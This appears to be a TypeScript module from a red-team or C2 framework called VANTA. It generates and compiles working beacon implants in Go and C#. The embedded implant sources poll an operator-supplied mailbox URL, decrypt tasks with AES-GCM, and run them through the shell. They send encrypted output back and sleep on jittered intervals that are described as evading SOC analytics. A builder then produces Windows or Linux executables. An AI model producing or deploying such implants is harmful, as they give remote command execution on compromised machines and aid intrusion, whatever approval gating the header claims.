/**
 * Cross-language native beacon generation (T1071.001).
 *
 * TypeScript port of `modules.implant_gen.native`. Generates real,
 * compilable beacon implants that speak the same c2_platform mailbox
 * protocol as the JS `LegitC2Beacon`:
 *
 * * fetch   — GET the mailbox URL, parse a JSON array of sealed task blobs
 * * unseal  — AES-GCM decrypt with the shared 32-byte key
 * * execute — run the command through the shell
 * * post    — POST the sealed result back
 * * sleep   — jittered interval (defeats fixed-interval SOC analytics)
 *
 * Compilation is a file operation only; deployment and execution remain
 * HITL-gated and out of scope of generation.
 */

import { execFile } from "node:child_process";
import { mkdir, readFile, readdir, stat, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { promisify } from "node:util";

const execFileP = promisify(execFile);

export interface BuildResult {
  status: "built" | "failed" | "unavailable";
  artifact?: string;
  format?: string;
  goos?: string;
  note?: string;
}

function goBeaconSource(
  mailboxUrl: string,
  keyHex: string,
  session: string,
  opts: { intervalSeconds?: number; jitter?: number } = {},
): string {
  const intervalSeconds = opts.intervalSeconds ?? 30;
  const jitter = opts.jitter ?? 0.4;
  return `// VANTA native beacon — Go. Speaks the c2_platform mailbox protocol.
// Generated artifact: polls ${mailboxUrl} for sealed tasks, AES-GCM decrypts,
// executes, and posts sealed results. Dry-run of deployment — operator deploys.
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    crand "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "os/exec"
    "os"
    "strings"
    "time"
)

const (
    mailboxURL   = "${mailboxUrl}"
    keyHex       = "${keyHex}"
    sessionID    = "${session}"
    intervalBase = ${intervalSeconds} * time.Second
    jitterPct    = ${jitter}
)

func seal(plain []byte) ([]byte, error) {
    block, err := aes.NewCipher(mustKey())
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
        return nil, err
    }
    return gcm.Seal(nonce, nonce, plain, nil), nil
}

func unseal(sealed []byte) ([]byte, error) {
    block, err := aes.NewCipher(mustKey())
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce, ct := sealed[:gcm.NonceSize()], sealed[gcm.NonceSize():]
    return gcm.Open(nil, nonce, ct, nil)
}

func mustKey() []byte {
    key, err := hex.DecodeString(keyHex)
    if err != nil || len(key) != 32 {
        os.Exit(2)
    }
    return key
}

func fetch() []string {
    resp, err := http.Get(mailboxURL + "?session=" + sessionID)
    if err != nil {
        return nil
    }
    defer resp.Body.Close()
    var blobs []string
    if err := json.NewDecoder(resp.Body).Decode(&blobs); err != nil {
        return nil
    }
    return blobs
}

func post(sealed []byte) {
    buf := bytes.NewReader(sealed)
    resp, err := http.Post(mailboxURL+"?session="+sessionID, "application/octet-stream", buf)
    if err != nil {
        return
    }
    defer resp.Body.Close()
}

func nextSleep() time.Duration {
    base := float64(intervalBase)
    delta := base * jitterPct * (rand.Float64()*2 - 1)
    return time.Duration(base + delta)
}

func main() {
    for {
        for _, b64blob := range fetch() {
            sealed, err := hex.DecodeString(b64blob)
            if err != nil {
                continue
            }
            plain, err := unseal(sealed)
            if err != nil {
                continue
            }
            cmd := strings.TrimSpace(string(plain))
            if cmd == "kill" {
                return
            }
            out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
            if err != nil {
                out = append(out, []byte("\\n[exit " + fmt.Sprint(err) + "]")...)
            }
            sealedOut, _ := seal(out)
            post(sealedOut)
        }
        time.Sleep(nextSleep())
    }
}
`;
}

function csharpBeaconSource(
  mailboxUrl: string,
  keyHex: string,
  session: string,
  opts: { intervalSeconds?: number } = {},
): string {
  const intervalSeconds = opts.intervalSeconds ?? 30;
  return `// VANTA native beacon — C# (.NET). Speaks the c2_platform mailbox protocol.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;

public static class Beacon
{
    private const string MailboxUrl = "${mailboxUrl}";
    private const string KeyHex = "${keyHex}";
    private const string SessionId = "${session}";
    private static readonly TimeSpan Interval = TimeSpan.FromSeconds(${intervalSeconds});
    private static readonly Random Jitter = new Random();
    private const int GcmNonceSize = 12; // AES-GCM nonce (net6 AesGcm has no NonceSize member)

    private static byte[] MustKey()
    {
        var key = Convert.FromHexString(KeyHex);
        if (key.Length != 32) throw new InvalidOperationException("bad key");
        return key;
    }

    private static byte[] Unseal(byte[] sealedBlob)
    {
        using var aes = new AesGcm(MustKey());
        var nonce = sealedBlob[..GcmNonceSize];
        var ct = sealedBlob[GcmNonceSize..];
        var plain = new byte[ct.Length];
        aes.Decrypt(nonce, ct, null, plain);
        return plain;
    }

    private static byte[] Seal(byte[] plain)
    {
        using var aes = new AesGcm(MustKey());
        var nonce = new byte[GcmNonceSize];
        RandomNumberGenerator.Fill(nonce);
        var ct = new byte[plain.Length];
        aes.Encrypt(nonce, plain, ct, null);
        var outBlob = new byte[nonce.Length + ct.Length];
        Buffer.BlockCopy(nonce, 0, outBlob, 0, nonce.Length);
        Buffer.BlockCopy(ct, 0, outBlob, nonce.Length, ct.Length);
        return outBlob;
    }

    private static List<string> Fetch()
    {
        using var client = new HttpClient();
        var body = client.GetStringAsync(MailboxUrl + "?session=" + SessionId).Result;
        return JsonSerializer.Deserialize<List<string>>(body) ?? new List<string>();
    }

    private static void Post(byte[] sealedBlob)
    {
        using var client = new HttpClient();
        using var content = new ByteArrayContent(sealedBlob);
        _ = client.PostAsync(MailboxUrl + "?session=" + SessionId, content).Result;
    }

    public static int Main()
    {
        for (;;)
        {
            foreach (var hexBlob in Fetch())
            {
                var sealedBytes = Convert.FromHexString(hexBlob);
                var cmd = Encoding.UTF8.GetString(Unseal(sealedBytes)).Trim();
                if (cmd == "kill") return 0;
                string output;
                try
                {
                    var psi = new ProcessStartInfo("/bin/sh", "-c " + cmd) { RedirectStandardOutput = true, RedirectStandardError = true };
                    using var proc = Process.Start(psi)!;
                    output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                }
                catch (Exception ex)
                {
                    output = ex.Message;
                }
                Post(Seal(Encoding.UTF8.GetBytes(output)));
            }
            var baseMs = (int)Interval.TotalMilliseconds;
            var jitterMs = baseMs / 2 * (Jitter.NextDouble() * 2 - 1);
            Thread.Sleep(Math.Max(1000, baseMs + (int)jitterMs));
        }
    }
}
`;
}

export const CSHARP_CSPROJ = `<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <Nullable>disable</Nullable>
    <AssemblyName>vanta_beacon</AssemblyName>
  </PropertyGroup>
</Project>
`;

export class NativeImplantGenerator {
  generateGo(
    mailboxUrl: string,
    keyHex: string,
    session: string,
    opts: { intervalSeconds?: number; jitter?: number } = {},
  ): string {
    return goBeaconSource(mailboxUrl, keyHex, session, opts);
  }

  generateCsharp(
    mailboxUrl: string,
    keyHex: string,
    session: string,
    opts: { intervalSeconds?: number } = {},
  ): { program: string; csproj: string } {
    return { program: csharpBeaconSource(mailboxUrl, keyHex, session, opts), csproj: CSHARP_CSPROJ };
  }

  async buildGo(
    source: string,
    outDir: string,
    opts: { goos?: string; goarch?: string } = {},
  ): Promise<BuildResult> {
    const goos = opts.goos ?? "linux";
    const goarch = opts.goarch ?? "amd64";
    await mkdir(outDir, { recursive: true });
    const src = join(outDir, "beacon.go");
    await writeFile(src, source, "utf-8");
    const exe = join(outDir, goos === "windows" ? "vanta_beacon.exe" : "vanta_beacon");
    try {
      await execFileP("go", ["build", "-o", exe, src], {
        timeout: 180_000,
        env: { ...process.env, GOOS: goos, GOARCH: goarch, CGO_ENABLED: "0" },
      });
    } catch (err) {
      const e = err as NodeJS.ErrnoException;
      if (e.code === "ENOENT") return { status: "unavailable", note: "go toolchain not on PATH" };
      return { status: "failed", note: (err instanceof Error ? err.message : String(err)).slice(-500) };
    }
    try {
      await stat(exe);
    } catch {
      return { status: "failed", note: "go build produced no artifact" };
    }
    const head = Buffer.from(await readFile(exe)).subarray(0, 2);
    const format =
      head[0] === 0x4d && head[1] === 0x5a
        ? "PE (Windows)"
        : head[0] === 0x7f && head[1] === 0x45
          ? "ELF (Linux)"
          : "unknown";
    return { status: "built", artifact: exe, format, goos };
  }

  async buildCsharp(source: string, csproj: string, outDir: string): Promise<BuildResult> {
    const proj = join(outDir, "csharp_beacon");
    await mkdir(proj, { recursive: true });
    await writeFile(join(proj, "Program.cs"), source, "utf-8");
    await writeFile(join(proj, "vanta_beacon.csproj"), csproj, "utf-8");
    try {
      await execFileP("dotnet", ["build", proj, "-v", "q", "--nologo"], { timeout: 180_000 });
    } catch (err) {
      const e = err as NodeJS.ErrnoException;
      if (e.code === "ENOENT") return { status: "unavailable", note: "dotnet toolchain not on PATH" };
      return { status: "failed", note: (err instanceof Error ? err.message : String(err)).slice(-500) };
    }
    const built = await findFiles(proj, /vanta_beacon(\.dll)?$/);
    if (!built.length) {
      return { status: "failed", note: "dotnet build produced no vanta_beacon artifact" };
    }
    return { status: "built", artifact: built[0] };
  }
}

async function findFiles(dir: string, re: RegExp): Promise<string[]> {
  const out: string[] = [];
  const entries = await readdir(dir, { withFileTypes: true }).catch(() => []);
  for (const entry of entries) {
    const full = join(dir, entry.name);
    if (entry.isDirectory()) {
      out.push(...(await findFiles(full, re)));
    } else if (re.test(entry.name)) {
      out.push(full);
    }
  }
  return out;
}

export { goBeaconSource, csharpBeaconSource };
